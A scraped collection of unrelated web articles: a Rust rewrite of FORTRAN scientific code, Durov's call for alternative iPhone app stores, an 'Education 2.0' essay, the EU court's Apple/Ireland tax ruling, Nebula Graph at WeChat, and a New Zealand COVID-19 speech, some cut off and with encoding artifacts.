business component so uptime and upkeep of the original implementation are irrelevant.</p><p>Given all of this I decided it would be faster to rewrite in Rust, then be able parallelise it and add features quickly than it would be to plough through with the FORTRAN, and with a go-ahead from my supervisor I got to work.</p><h2 id="translating-fortran-to-rust">Translating FORTRAN to Rust</h2><p><em>Relatively</em> straightforward translation of existing codebases in compiled languages to Rust is a noted benefit due to the combination of software like <a href="https://c2rust.com/">C2Rust</a> to perform automatic translation of C source into Rust, <a href="https://github.com/rust-lang/rust-bindgen">bindgen</a> for automatically generating FFI bindings and of Cargo’s ability to compile code in other languages as part of a Rust project. While there are plenty examples of large projects successfully migrating to Rust this way, the issue I faced was that it would have required a two-step process, first translating from FORTRAN to C and then from C to Rust. I assumed the likelihood that the resulting code would be remotely parsable was very low and I couldn’t even get either of the most popular FORTRAN to C conversion tools to work.</p><p>Since the original implementation was only 6,000 lines total I decided to go with a manual translation. This involved starting at the base of the module tree with the Fast Fourier Transform routines and working upwards. I kept my process simple by inserting small pieces of FORTRAN to dump state at the beginning and end of routines which was then used for snapshot tests for the Rust implementation. This resulted in a thorough, robust testing suite which was invaluble during the optimization period. I really only made one bad design decision (please don’t read through the git history to confirm this 😅) during the translation phase which was thinking that nested <code>Vec</code>s would be easier than using <code>ndarray</code> from the start. This was a Bad Decision™️ and wasted so much time, not only in the abysmal execution speeds slowing down <code>cargo test</code>, but also in that it significantly increased development time. I would replace a statement such as</p><p>with</p><div><pre><code data-lang="rust"><span>// Awful, awful Rust
</span><span></span><span>for</span> i <span>in</span> <span>0</span>..x {
	<span>for</span> j <span>in</span> <span>0</span>..y {
		a[i][j] <span>=</span> a[i][j] <span>*</span> b[i][j]
	}
}
</code></pre></div><p>when the final <code>ndarray</code> version would look like</p><div><pre><code data-lang="rust"><span>// Ergonomic Rust
</span><span></span>a <span>*=</span> <span>&amp;</span>b;
</code></pre></div><p>Clearly the intermediary step could have been skipped and a more direct translation was possible. I wrote a regex to replace FORTRAN array indexing syntax (<code>array(x,y,z)</code>) to nested <code>Vec</code>s in Rust (<code>array[x][y][z]</code>), when <code>ndarray</code> syntax (<code>array[[x,y,z]]</code>) would have been a far simpler conversion. If this decision wasn’t bad enough, I also wasted time writing several functions to convert between a byte slice and the nested <code>Vec</code>s with the FORTRAN memory layout when <code>ndarray</code> has a built-in preset for FORTRAN shape and strides.</p><p>One issue that arose during testing was that due to the accumulation of small errors in floating point math, results would be slightly different between operating systems and hardware configurations which made the fantastic snapshot testing tool <code>insta</code> unsuitable. Instead <code>ndarray</code>’s <code>serde</code> and <code>approx</code> feature flags are used to read serialised arrays from disk to compare approximately during tests which has been working well.</p><h2 id="optimizing">Optimizing</h2><h3 id="parallelisation">Parallelisation</h3><p>Fundamentally the problem is not one that may be described as “embarrassingly parallel”, which was the assumption made going into the project (early discussions involved expectations of a 100x improvement on the university cluster). Ideally we would be want many large chunks of independent computation operating on a small amount of data, making it easy to distribute work across threads, GPUs and potentially different machines, but unfortunately I learned this problem is quite far from that ideal.</p><p>The outermost loop advances through time and is therefore strictly sequential, and in the primary function of the program (<code>src/nhswps/advance.rs:advance</code>) a large portion is iterated over twice, also strictly sequential. Some other lower-level functions perform operations on individual layers and so can be parallelised completely, but these are not generally very complex functions and so finish quickly before returning to sequential execution. <a href="https://en.wikipedia.org/wiki/Amdahl%27s_law">Amdahl’s Law</a> comes into affect here, describing how even if everything that can be parallelised is, there are fundamental limits to the scaling we can ever achieve.</p><h3 id="memory-bandwidth-issues">Memory Bandwidth Issues</h3><p>Throughout the program there are several kinds of operations being performed on the 2- and 3-dimensional arrays. Transformations between physical and spectral is common, involving calling the Fourier transform functions and swapping axes. Other than those, many operations are simple additions, subtractions and multiplications between arrays, sometimes including constants. The result of this is that these simple operations are being performed on some very large amounts of data which I believe is resulting in a memory bandwidth bottleneck. This hypothesis explains why SIMD did not improve performance and performance is not significantly improved by parallelisation. It only takes several cycles to perform a floating point ADD or MUL instruction, so even at tens of gigabytes per second of memory bandwidth it will be insufficient to keep the CPU “fed”. Performing the operations with AVX-2 instructions does not improve performance because even though the same operation may now be performed on several floats simultaneously the limit is still how quickly they may be read from memory. It is slightly more complicated in the multithreaded context because there is an improvement in performance; perhaps due to multiple threads being able to increase the amount of data read from memory. The program is also very cache-unfriendly, reading large amounts of data in only to perform a simple, fast operation before reading in new data. At several gigabytes in size even individual layers aren’t even close to being able to reside in on-die cache. I am unsure of how I might collect proof of my hypothesis but I believe it explains a great deal of the behaviours I’ve witnessed throughout this project.</p><h3 id="gpu-unsuitability">GPU Unsuitability</h3><p>There was also some hope at the beginning of the project that GPUs could be used but there are two main reasons they are unsuitable.</p><p>Firstly, ~GPUs with large amounts of VRAM (128GB+) simply aren’t available~ EDIT: I was wrong, <em>commercial</em> gaming and workstation GPUs don’t get that large, but there are plenty of datacentre options, like the <a href="https://cloud.google.com/blog/products/compute/announcing-google-cloud-a2-vm-family-based-on-nvidia-a100-gpu">A100</a>. There is the <a href="https://www.amd.com/en/products/professional-graphics/radeon-pro-ssg">Radeon Pro SSG</a> which is a really interesting product but the memory bandwidth of …</p></article></section></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-8890"><div><div><div><p>VK social networking website and Telegram messenger App founder and developer, Pavel Durov wants Apple to let iPhone users install different App stores other than Apple App Store. Not only that, but he also wants legislation to make this happen.</p><p>Speaking at the panel discussion with Russian Prime Minister Mikhail Mishustin and representatives of the IT industry in Innopolis, Telegram Manager and Vice President, Ilya Perekopsky said that Apple and Google are holding back the development of startups by charging a tax of 30 percent commission from app developers. Immediately after Perekopsky’s speech,&nbsp;Durov published an article in which he called for legislation mandating Apple to be legally obliged to allow users to install an alternative App Store on the iPhone. Durov says that Tim Cook, Apple CEO should be obligated to this at the legislative level.</p><p>Durov is taking the bull by its horn. Apple has been successful because of its closed technology. It not only does not allow any other App store to be installed on iPhones but it also takes action against any iPhone jailbreaks that happen. We all know that the <a href="https://androidrookies.com/unc0ver-jailbreak-tool-for-iphone-released-works-on-all-ios-versions-including-ios-13-5/">uc0ver team released a jailbreak</a> exploiting the previously unknown vulnerability in iOS just hours after Apple released iOS 13.5. The <a href="https://androidrookies.com/kernel-vulnerability-unc0ver-jailbreak-patched-as-apple-releases-ios-13-5-1/">iPhone jailbreak was shut down in iOS 13.5.1</a> within days by Apple. Many private iPhone App stores exist like Cydia, Xabsi, etc but they work only on jailbroken iPhones.</p><p>Much of Apple’s profit is from selling content on its App stores. In fact, Apple’s App Store platform grossed around $50 billion for App store in 2019, according to an analysis by CNBC. Apple takes 30 percent commission from App developers to make their apps available on Apple Store. Last year it paid $35 billion to developers from the App store revenue and kept $15 billion for itself.</p><p>Durov has reasons for being mad at Apple for not allowing other App stores. Durov says that Russian startups fail to make money by paying 30% to Apple. “Preventing two supranational corporations from collecting taxes from all of humanity is not an easy task. Corporations employ thousands of lobbyists, lawyers, and PR agents, and their budgets are unlimited. At the same time, app developers are scattered and scared, as the fate of their projects depends entirely on the favor of Apple and Google,” wrote Pavel Durov.</p><p>Durov also has a personal bias for wanting Apple to open up its iOS for alternative App stores. In 2016, Apple banned the Telegram team from launching its own game platform. This hurt Durov and Telegram’s ambitions, “We had to remove the telegram games catalog that we had already created and almost the entire platform interface, otherwise Apple threatened to remove Telegram from the AppStore.”</p><p>Recently, <a href="https://androidrookies.com/apple-threatens-to-remove-hey-com-email-app-unless-it-pays-outrageous-cuts-to-them/">email client, Hey.com</a> had a similar experience with Apple regarding publishing their App on the Apple App store.</p></div></div></div></article></div>]]>

Depending on their deal, certain responsibilities are shifting. For STOMT it was especially difficult: Who cares about feedback? Customer service (publisher)? The producer (developer)? The developer?

      <div><p>What this essay does is that it introduces a brand new education system. This education system is way more effective than the current education system we have in place. And unlike the current education system, which has been the same for a long time. This one is constantly getting better with time and data, thanks to AI.<br></p><p>The best thing about it is that it's totally free of cost. So anyone in the world with access to a basic smartphone+Internet can access Education 2.0. Meaning, now everyone has the same educational opportunities as a Harvard/Stanford student.<br></p><p>You see, education is the most fundamental thing to human progress. And once you deploy something like Education 2.0 on a global scale, it will have huge positive implications on economic growth, life quality, and human progress. And to emphasise what I just said, the collective intelligence of humanity is the best predictor of future progress.Â&nbsp;<a href="https://ourworldindata.org/global-education#education-outcomes-predict-economic-growth" target="_blank">Here</a>Â&nbsp;is some empirical data to prove this statement. Nevertheless, you don't need empirical evidence; look around, education is what drives societal growth.<br></p><p>Looking at the current education system we have in place. It would be unfair to say that it hasn't done an excellent job in aiding human progress. Resolving the COVID-19 Pandemic, the Apollo Program, the iPhone, Tesla, SpaceX, the Internet, All of Science etc. are a prime example.<br></p><p>But it certainly hasn't been able to keep up with the growing human population, and the challenges raised by it. Looking at all the pressing issues, we face today like global poverty, climate change, and war. The incapability of civilisation to solve these problems stems from the fact that it's not educated enough as a whole. There is conclusive evidence to prove this â€”Â&nbsp;<a href="https://ourworldindata.org/global-education#social-returns-to-education" target="_blank">Education correlates with prosocial behaviour</a>. Prosocial behaviour is behaviour, which affects society as a whole.<br></p><p>So the best way to ensure that we progress into a brighter future is by rewiring the current education system. So it can keep up with the ever-growing population and the challenges we face, which will then eventually increase the collective wisdom and prosocial behaviour of humans at a much faster rate.<br></p><p>There are 3 main issues with the current education system, which dramatically lowers its potential.<br></p><ol>
<li>Its inability to reach a large population of the world.</li>
<li>The unequal distribution of resources.</li>
<li>The low efficacy of the current learning environments (i.e. lectures/books).</li>
</ol><p>And Education 2.0 fixes all of these issues.<br></p><p><strong><u>No access to education</u></strong></p><p>The biggest problem with the current education system is that it's unable to reach an unfairly enormous number of the global population. People say that education is a human right, but looking at the current situation â€” that doesn't seem so.</p><p>According to Humanium.org,Â&nbsp;<strong>72 million</strong>Â&nbsp;children of primary education age are not in school, andÂ&nbsp;<strong>759 million</strong>Â&nbsp;adults are illiterate.<strong>Â&nbsp;</strong>And we haven't even considered the inconsistency in educational outcomes yet.<br></p><p>Now I would like to explain the enormous implications this has on the economy. But first, I would like toÂ&nbsp;<a href="https://ourworldindata.org/grapher/correlation-between-mean-years-of-schooling-and-gdp-per-capita" target="_blank">establish a conclusive link between Education and GDP per capita</a>.<br></p><p>Now doing the math:<br></p><ul><li>
<strong>$18,381</strong>Â&nbsp;is the global average GDP per capita (a measure of economic output per person), and we haveÂ&nbsp;<strong>831 million peopleÂ&nbsp;</strong>with no access to education at all.</li></ul><ul><li>
<strong>831 million people * $18,381 ~ $15 Trillion</strong>Â&nbsp;worth of economic output wasted. And it has a growth rate of ~<strong>Â&nbsp;1.8% per year</strong>Â&nbsp;(Taking into account the growth rates of global GDP &amp; global population).</li></ul><ul><li>To put this number in perspective, this is more than the GDP of<strong>Â&nbsp;China</strong>,Â&nbsp;<strong>India,</strong>Â&nbsp;andÂ&nbsp;<strong>the UK</strong>Â&nbsp;separately, andÂ&nbsp;<strong>$5 TrillionÂ&nbsp;</strong>less than the USA.</li></ul><p>There is no doubt that the current model of the education system is responsible for this issue. An education system is basically a collection of what we call "learning environment.". And a learning environment is an environment where learning takes place (i.e. classroom).</p><p>You see, the major problem with the current system is the high relative cost of setting up that learning environment (i.e. a classroom with qualified teachers, furniture, and students, etc.). So when you scale the education system, the setup + maintenance costs increase with it. And some countries just don't have the resources to scale. This can be due to many factors like large population, not enough teachers, etc. All of these issues then boil down to one primary issue â€” lack of economic resources, aka no money.</p><p>Scaling requires huge costs, which then dramatically lowers the potential for impact. Due to which, a significant amount of people in the world don't have access to basic education.</p><p>To beat this issue, what we need to do is switch to a new model of the education system. One which can scale cheaply and effectively. The best way to do this is by moving to a more digitalised education system.</p><p>One way to go about doing this is by leveraging Software, AI, and low-cost smartphones. Software and AI can be leveraged to create digital learning environments, which are more effective than the current learning environments we have, and its efficacy improves with time &amp; data. These AI-taught lessons will be way better than attending a Stanford/Harvard lecture.<br>
</p><p>Once this works, the next thing to do is to ensure it supports low-cost smartphones, which will then allow for distribution at an enormous scale, while keeping the costs minimal. This will go a really long way in closing the educational gap. The best thing is that now anyone in the world will be able to have the same educational opportunities as an Ivy-League student.</p><p>In the long-term, you will see substantial positive implications on collective prosocial behaviour, economy, and quality of life. And redundancy in the current education system.<br>
</p><p><strong><u>Unequal distribution of educational resources</u></strong><br>
</p><p>First, we looked at inequality in terms of access to education. Now, we're going to look at inequality inside the people with access to education (in terms of the quality of educational resources). Turns out that this has huge negative implications on the overall learning outcome of the education system.</p><p>It is implausible to sustain the quality of educational resources (e.g. teachers, books, etc.) as you scale (make it available for a larger population) the education system. Due to which, a major side-effect of scaling is that it induces a widely unequal distribution of educational resources, which varies by economic demographic. Which then leads to variation in educational outcomes.</p><p>This is why the number of high-school graduates who attend prestigious colleges tends to be higher in private high-schools, relative to a public high-schools. The quality &amp; quantity of educational resources (quality of teachers, study material, support, etc.) available to students at the private school is more elevated. Which then leads to higher success.Â&nbsp;<br></p><p>Inequality in educational resources leads to a variation in educational outcomes, which then lowers the average output of the education system.</p><p>Now, coming around to solve this issue. We need to create a system where the quality of educational resources is the best on earth. And it's available to everyone, no matter their economic situation. And finally, as it scales, its overall effectiveness doesn't reduce.Â&nbsp;<br></p><p><strong><u>Low efficacy of current learning environments</u></strong></p><p>The final issue I would like to talk about is regarding the teaching methods used currently. Teaching methods are ways in which teachers teach the student. Â&nbsp;<br></p><p>The problem is that the current teaching methods, which are used around the world, are scientifically flawed. This then makes the process of learning inefficient and ineffective. And on a large scale, it reduces the learning output (the product of learning) of the education system.<br></p><p>You might think that sitting in a classroom, while a teacher speaks out everything, and you note it down is an excellent way to learn. But in fact, this method is flawed. The reason it's flawed because it bears no consideration whatsoever to how our brain operates during learning. Due to which, the conversion rate from auditory + visual perception to long-term memory is low. This dramatically lowers the learning potential of the student.<br></p><p>The modern K-12 education system was established back in the 19th century to prepare the population to participate in the Industrial Revolution. At the time, not a lot of thought was given to the science of how we learn; they just wanted a cheap way to deliver information to a large number of students. And surprisingly, this factory model of the education system hasn't changed since then.<br></p><p>What we need to do now is to build a digital learning environment, which makes learning way more effective &amp; efficient. Leading to a dramatic increase in learning output of the education system. And leverage AI, to make it so that it improves its efficacy with time &amp; data.<br></p><p>The way to do this is by understanding thoroughly, how the human brain operates while learning. And then using those scientific principles to design the learning environment.Â&nbsp;<br></p><p>Here is a fantastic essay by Andy Matuschak, which explains what I just said above better. You can read itÂ&nbsp;<a href="https://andymatuschak.org/books/" target="_blank">here</a>.</p><p>The starting point for this digital learning environment should be something, which is way more effective than any learning environment present today. Deploying this on a global scale will yield dramatically higher overall learning output than today. Making the current education systems redundant.Â&nbsp;</p><p>This would be the first step in accelerating the advent of Education 2.0. A world where high-quality education is free of cost to anyone and the quality of education is increasing over time. In the long term, this will mitigate all forms of inequality, and help humanity get onto a path of something bigger and brighter, thanks to its more immense collective wisdom.</p><p><b><u>Education 2.0Â&nbsp;</u></b></p><p><b><u></u></b>We have now talked about the major issues our education system faces and potential solutions to them. I would now like to introduce a brand new education system â€” Education 2.0.<b><u><br></u></b></p><p>Introducing …</p></div></div></div>

                    <p title="Wednesday 15 Jul 2020, 3:25 PM"><span></span>Updated Wed 3:25 PM</p>                <p>A TOP EU court has ruled in favour of Ireland and Apple in their appeal against the European Commission’s finding that the country breached state aid rules in its dealings with the multinational.</p>
<p>The European Commission previously ordered the US company to hand back €13 billion in unpaid tax and over €1 billion in interest payments to the Irish government.</p>
<p>Both Ireland and Apple appealed that ruling and the General Court of the European Union has now found in their favour.</p>
<p>It is widely expected that this ruling will be appealed to the European Court of Justice, with parties having a little over two months to file an appeal.</p>
<p>In its judgement, the General Court of the European Union said:
</p>
<blockquote>
<p>By today’s judgement, the General Court annuls the contested decision because the Commission did not succeed in showing to the requisite legal standard that there was an advantage for the purposes of Article 107(1) TFEU.According to the General Court, the Commission was wrong to declare that Apple Sales International (ASI) and Apple Operations Europe (AOE) had been granted a selective economic advantage and, by extension, State aid.The General Court endorses the Commission’s assessments relating to normal taxation under the Irish tax law applicable in the present instance, in particular having regard to the tools developed within the OECD, such as the arm’s length principle, in order to check whether the level of chargeable profits endorsed by the Irish tax authorities corresponds to that which would have been obtained under market conditions.However, the General Court considers that the Commission incorrectly concluded, in its primary line of reasoning, that the Irish tax authorities had granted ASI and AOE an advantage.
</p>
</blockquote>
<p>Apple Operations International (AOI) and Apple Sales International (ASO) were two Apple subsidiaries that were based in Ireland.&nbsp;</p>
<p>The General Court of Justice went on to say: “The Commission did not prove, in its alternative line of reasoning, that the contested tax rulings were the result of discretion exercised by the Irish tax authorities and that, accordingly, ASI and AOE had been granted a selective advantage.”</p>

<p><strong>Reaction</strong></p>
<p>Both Apple and the Irish government have welcomed the judgement.</p>
<p>“This case was not about how much tax we pay, but where we are required to pay it,” an Apple spokesman said in a statement.</p>
<p>“We’re proud to be the largest taxpayer in the world as we know the important role tax payments play in society,” Apple added.</p>
<p>The government has welcomed the judgement, stating in a statement that Ireland has “always been clear that, based on Irish law, the correct amount of Irish tax was charged and that Ireland provided no State aid to Apple”.&nbsp;</p>
<p>“Ireland appealed to the Commission decision on that basis and the judgement today from teh court vindicates this stance.”</p>
<p>The Department of Finance said the decision showed there had been “no special treatment” for the tech giant.</p>
<p>“We welcome the judgment by the General Court of the European Union annulling the Decision of the European Commission of August 2016, which alleged Ireland provided State aid to Apple,” the department said in a statement.</p>
<blockquote>
<p>Ireland has always been clear that there was no special treatment provided to the two Apple companies – ASI and AOE. The correct amount of Irish tax was charged taxation in line with normal Irish taxation rules. Ireland appealed the Commission decision on the basis that Ireland granted no state aid and the decision today from the Court supports that view.</p>
</blockquote>
<p>Finance Minister Paschal Donohoe said the judgement “proves Ireland was correct to pursue this case in the European courts”.&nbsp;</p>


<p>The court was asked to determine whether two tax rulings delivered by Revenue in 1991 and 2007 allowed Apple to funnel profits through Irish-anchored structures without paying tax in any jurisdiction.</p>
<p>It is the first legal ruling in a case that formally kicked off in 2014 when the Commission opened an investigation into the matter, which concluded in 2016. The decision could have major implications for the European Commission’s plans to harmonise tax regimes across member states.&nbsp;</p>
<p>The Commission had found that the two rulings had breached EU state aid rules designed to prevent individual companies from receiving favourable treatment from member state governments. As then-commissioner for competition Margrethe Vestager put it at the time, “Ireland had granted illegal tax benefits to Apple”.</p>
<p>After concluding that Apple had been paying corporation tax at an effective rate of just 0.005%, the Commission ordered the US company to hand back €13 billion in unpaid tax and over €1 billion in interest payments to the Irish government.&nbsp;</p>
<p>Apple denied that it had ever sought special deals with any government and accused the Commission of selectively quoting “tiny figures”.&nbsp;</p>
<p><a href="https://ec.europa.eu/commission/presscorner/detail/en/statement_20_1356">In a statement this morning</a> Vestager, who is now Executive Vice-President of the Commision, said that the body will “carefully study the judgment and reflect on possible next steps”.</p>
<p>“The Commission stands fully behind the objective that all companies should pay their fair share of tax,” she said.&nbsp;</p>
<blockquote>
<p>If member states give certain multinational companies tax advantages not available to their rivals, this harms fair competition in the EU. It also deprives the public purse and citizens of funds for much needed investments the need for which is even more acute during times of crisis.</p>
</blockquote>
<p><strong>Political reaction</strong></p>
<p>Following Apple’s appeal of the 2016 Commission finding, the Fine Gael minority government at the time, supported by Fianna Fáil, decided to join the appeal – prompting significant political and public opposition.</p>

<p>Responding to the ruling this morning, former minister Charlie Flanagan said: “Important EU court ruling vindicates actions of Enda Kenny, Michael Noonan and government despite incessant hostility at home and abroad.”</p>
<p>Sinn Féin’s finance spokesperson Pearse Doherty TD said that “morally this is a terrible day” because Apple was allowed to avoid paying a “fair amount of tax”</p>
<p>“Apple had three stateless companies here, ‘we shouldn’t pay tax here, or anywhere in the world’. So, while the Department of Finance may be thinking that this is a good day for themselves, morally this is a terrible day,” Doherty told RTÉ’s Today with Sarah McInerney.</p>
<p>“The richest company in the world was able to generate over €100 billion of profits and not pay tax anywhere in the world on those profits despite the fact that the companies are incorporated here in Ireland. “&nbsp;</p>

<span>2020-07-02</span></p></div><p><img src="https://user-images.githubusercontent.com/57335825/87518187-cdb4d200-c634-11ea-9dc4-264001420b55.png" alt="Nebula Graph for Large Social Network: Practices at WeChat"></p><p>WeChat is one of the social network apps in the world that deals with large scale heterogeneous graphs. The dataset to be processed has:</p><ul><li>One trillion edges/connections</li><li>A total dataset of 150TB</li><li>An hourly update of 100 billion connections,</li></ul><p>And it is a huge challenge. The team at WeChat encountered problems when using <a href="https://github.com/vesoft-inc/nebula">Nebula Graph</a>, an open source distributed graph database.</p><p>However, through deep customization capabilities in the database, the team has realized some useful on-demand features. They include big data storage, data import for large data sets with a fast performance, version control, rollback at the second level, and access to the database at millisecond level.</p><h2 id="the-challenges-facing-large-internet-companies">The Challenges Facing Large Internet Companies</h2><p>Most well-known graph databases are not capable of dealing with truly big data. For example, the community version of <a href="https://neo4j.com/">Neo4j</a> provides single-host service and is widely adopted in the knowledge graph area. However, when it comes to a very large data set this solution misses the mark. And large data sets are increasingly common in today’s business world.</p><p>Plus, there are issues like data consistency and disaster recovery to consider if you choose a multi-copy implementation. <a href="https://janusgraph.org/">Janus Graph</a> has solved the big data storage problem by using external metadata management, kv storage and indexes. Yet the performance has been widely criticized. As a result, most graph database solutions that the WeChat team evaluated are many times better than Janus Graph in terms of performance.</p><p>Some Internet companies build their own databases. These self-developed solutions are catering to their own business requirements, rather than for general graph scenarios. So, they support only a limited proportion of query syntaxes.</p><h3 id="geabase-from-ant-financial">GeaBase from Ant Financial</h3><p><a href="https://tech.antfin.com/products/GEABASE">GeaBase</a> is another option, mainly used in the finance industry. It features a self-developed query language, pushdown computation and millisecond latency. The main scenarios for its usage include risk management in financial organizations. To this end, it supports a transaction network with trillions of edges/relationships, storing real-time transaction data, real-time fraud detection.</p><p>It is also useful for recommendation engines. This includes applications like stocks and securities recommendations. Its Ant Forest features the capability to store trillions of nodes, strong data consistency, and low latency querying. It also has a GNN feature for Dynamic Graph CNN, for online inference based on dynamic graphs.</p><h3 id="igraph-from-alibaba">iGraph from Alibaba</h3><p>There is also iGraph, a graph indexing and query system. It stores user behavior information and serves as one of the four backbone middle platforms in Alibaba. iGraph has adopted Gremlin as its graph query language for real-time queries of e-commerce relationships.</p><h3 id="bytegraph-from-bytedance-aka-tiktok">ByteGraph from ByteDance (a.k.a TikTok)</h3><p>By adding a cache layer to the kv layer, ByteGraph splits the relationships into B+ trees for efficient access to edges and data sampling. The structure is like the TAO of Facebook.</p><h2 id="architecture-of-the-wechat-big-data-solution">Architecture of the WeChat Big Data Solution</h2><p>The WeChat team has come up with the following architecture to solve the big data storage and processing problem.</p><p><img src="https://user-images.githubusercontent.com/57335825/86352447-a87a9980-bc1a-11ea-83c6-47a481675e9e.png" alt="Architecture of the WeChat Big Data Solution"></p><h2 id="why-nebula-graph">Why Nebula Graph?</h2><p>As seen in the architecture above, a graph database is the main component of the solution. WeChat ended up selecting Nebula Graph as the starting point of its journey in exploring graph databases.</p><p>WeChat found Nebula Graph had the most potential for handling huge dataset storage needs based on the capability of dataset partitioning and an independent relationship storage. It also had pushdown computation and MPP optimization based on the strong consistency storage engine. Finally, the team had extensive experience in the graph database field and a proven model for abstraction for big data.</p><h2 id="problems-in-practice-nebula-graph">Problems in Practice Nebula Graph</h2><h3 id="insufficient-memory">Insufficient Memory</h3><p>The WeChat team encountered memory issues. At its essence, it was a problem of performance versus resources. Memory occupation is an un-neglectable issue in an application dealing with large scale datasets.
There are a couple of components in RocksDB that contribute to memory usage. There are Block cache, Indexes and bloom filters. There are also Memtables and Blocks pinned by iterators.
So, the WeChat team moved to optimize memory utilization. It began with block cache optimization. To do this, it adopted a global LRU cache to control the cache occupation of all RocksDB instances in a machine.</p><p>Then the team did a bloom filter optimization. An edge is designed as a key-value pair and stored in RocksDB. If all keys are stored in a bloom filter and each key occupies 10bit, then the memory required by the entire filter will exceed the machine memory by a large margin.</p><p>The team observed that most of the time the requests are to acquire a list of edges for a specific node. Therefore, the team adopted a prefix bloom filter. Another optimization was made to create indexes for properties on vertices, which enables acceleration for most requests. Finally, the memory occupation of a single-host filter is at the gigabyte level without sacrificing the speed of most requests.</p><h3 id="version-control">Version Control</h3><p>There are several business requirements in practice for version control. It offers graph data fast rollback, periodic full data import, and automatic access to the latest versioning data. The team has classified data sources into two categories.</p><p>Recurring data, for example, generates a list of similar users by day and the data takes effect after being successfully imported. Then there is History data and real-time data. For example, there is refresh history data by day and the team combines the history data with real-time data as full data to be imported.</p><p>Following is the data storage model in RockDB.</p><p>Vertex Storage Model:</p><p><img src="https://user-images.githubusercontent.com/57335825/86352518-c516d180-bc1a-11ea-9ea3-25a774e6478c.png" alt="Vertex Storage Model in RocksDB"></p><p>Edge Storage Model:</p><p><img src="https://user-images.githubusercontent.com/57335825/86352600-e2e43680-bc1a-11ea-819c-6161cdf719b3.png" alt="Edge Storage Model in RocksDB"></p><p>Timestamp is used as the versioning method for real-time data. The version of imported data is specified manually. In practice, the team has three options for version control. First, reverse_versions, where the list of versions is to be kept for rollback. Second is active_version, where the version is accessed by users’ requests. And finally, max_version, where data is reversed after a certain version. The reversed data is the combination of the history data and the real-time data.</p><p>Using the three options, the team can manage offline data and online data efficiently. The data that is no longer used is cleared from the disk during the next compaction.
In this way, the application can update the data version without in the background. And the data rollback can be completed within seconds.</p><p>Below are some examples:</p><ul><li>Keep three versions of data and activate one of them</li></ul><p><code>alter edge friend reserve_versions = 1 2 3 active_version = 1</code></p><ul><li>Data sources are history data and real-time write data</li></ul><p><code>alter edge friend max_version = 1592147484</code></p><h2 id="fast-full-data-import">Fast Full Data Import</h2><p>Conducting data imports at a large scale is a common practice. The import requests, without any optimization, would not only affect requests in production, but take longer than a day to complete. So, it became an urgent requirement to improve import speed. SST Ingest is a commonly adopted method to achieve fast import. The WeChat team adopted something similar.</p><p>The team generated SST files offline via scheduling Spark tasks. Storage nodes pull the data required and ingest the data to the graph database. And, then there is access to the latest versioning data via the version control request. The import process takes several hours to complete, which is fast. And it does not affect requests to the graph database because the computation is mainly offline.</p><p>The shared-nothing architecture is a widely discussed method for ensuring horizontal scalability. It requires programming skills to implement the architecture in practice. The meta cache is encapsulated with <code>shared_ptr</code> and is frequently accessed, making it a warm bed for atomic operation clashing. To realize shared-nothing, the WeChat team copied each meta cache as a local thread. This <a href="https://github.com/vesoft-inc/nebula/pull/2165">pull request</a> provides details.</p><p>It has been a long journey to achieve graph database utilization. And it is one that continues with success in large part by overcoming obstacles.</p><h2 id="you-might-also-like">You Might Also Like</h2><ul><li><a href="https://nebula-graph.io/posts/detect-corona-virus-spreading-with-graph-database/">Detect Corona Virus Spreading With Graph Database Based on a Real Case</a></li><li><a href="https://nebula-graph.io/posts/review-on-graph-databases/">A Review of Graph Databases</a></li></ul><blockquote><span>Like what we do ?

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Kia ora tatou</p>
<p><span><span><span><span>Today I am setting out our plan in the event we have a new case of community transmission of COVID-19 in New Zealand. </span></span></span></span></p>
<p><span><span><span><span>I will take a bit of time to do that, and then I’ll be happy to take questions at the end. </span></span></span></span></p>
<p><span><span><span><span>Since we moved to level one, we have continued work to ensure we have an ongoing level of preparedness for resurgence in New Zealand. </span></span></span></span></p>
<p><span><span><span><span>The framework I will be speaking to today has been through a Cabinet process, and is more important than ever. </span></span></span></span></p>
<p><span><span><span><span>It is designed to give the public, and our business community as much certainty as we can around what to expect if new cases inside our borders are found. And that is something we all must prepare for. </span></span></span></span></p>
<p><span><span><span><span>We have been 75 days without community transmission here in New Zealand, but COVID is now exploding outside our borders and every country we have sought to replicate or have drawn from in the fight against COVID has now experienced further community outbreaks.</span></span></span></span></p>
<p><span><span><span><span>We only need to look to Victoria, New South Wales, Hong Kong, Singapore and Korea to see examples of other places that like us had the virus under control at a point in time only to see it emerge again. </span></span></span></span></p>
<p><span><span><span><span>This does not mean anyone has failed- it means perfection in the response to a virus, and a pandemic, is just not possible. That is certainly the case as we see this pandemic continue to grow.&nbsp;&nbsp; </span></span></span></span></p>
<p><span><span><span><span>The World Health Organisation this week reported the global infection rate is nearing 13 million cases, with over 215,000 cases reported globally on Tuesday. </span></span></span></span></p>
<p><span><span><span><span>To put that into perspective when we closed our borders on the 19th of March there were 240,000 cases in the world in total. It’s fifty times worse than that now. </span></span></span></span></p>
<p><span><span><span><span>We see this growth in cases around the world reflected in the steady stream of New Zealanders returning from overseas, some of whom are bringing the virus back with them, which we continue to contain at our borders. </span></span></span></span></p>
<p><span><span><span><span>In the main the pattern of returnees carrying the virus reflects the state of COVID in the world, with our cases coming from places like India, the US and the UK. </span></span></span></span></p>
<p><span><span><span><span>New modelling by Rodney Jones indicates there will be over 100,000 new cases a day in the US by the end of the month, nearly 70,000 cases a day in India and nearly 10,000 cases a day across Europe by early August. </span></span></span></span></p>
<p><span><span><span><span>We will continue to welcome home New Zealanders from these places as citizens, as they have a right to come home to their legal place of residence. But with that right comes risk, and the need to continue ongoing stringent measures to keep them, and everyone around them, safe. </span></span></span></span></p>
<p><span><span><span><span>Victoria in particular is a cautionary tale for New Zealand that we must learn from. </span></span></span></span></p>
<p><span><span><span><span>It appears their current outbreak is linked to a managed isolation facility similar to the ones we run here and that the entire outbreak was seeded by just two cases. </span></span></span></span></p>
<p><span><span><span><span>That goes to show how quickly the virus can spread and it can move from being under control to out of control, and that even the best plans still carry risk in a pandemic. </span></span></span></span></p>
<p><span><span><span><span>It’s important to remember that our border facilities have served us well so far. </span></span></span></span></p>
<p><span><span><span><span>Our testing regime is picking up cases amongst new arrivals who are in quarantine and nearly 30,000 people have been through a facility without a case of COVID transferring to the community. But there is limited room for error.</span></span></span></span></p>
<p><span><span><span><span>Just as many of our frontline health workers like nurses who were in contact with COVID patients got the virus from those patients during level 4 lockdown, our frontline border and airline staff and staff in our managed isolation facilities are in daily contact with returnees carrying the virus. Even our most experienced and trained support workers have picked up COVID.</span></span></span></span></p>
